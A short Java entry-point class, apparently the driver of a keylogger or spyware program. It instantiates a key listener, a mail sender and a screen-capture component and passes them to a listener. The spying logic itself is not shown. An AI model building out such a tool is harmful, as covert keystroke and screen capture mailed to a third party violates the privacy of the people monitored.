public class Drive {
	
	public static void main(String[] args) {
		MyKeyListener myKeyListener = new MyKeyListener();
		MailSender mailSender = new MailSender();
		ScreenTaker screenTaker = new ScreenTaker();
		Listen listen = new Listen(mailSender, screenTaker);
	}	
}
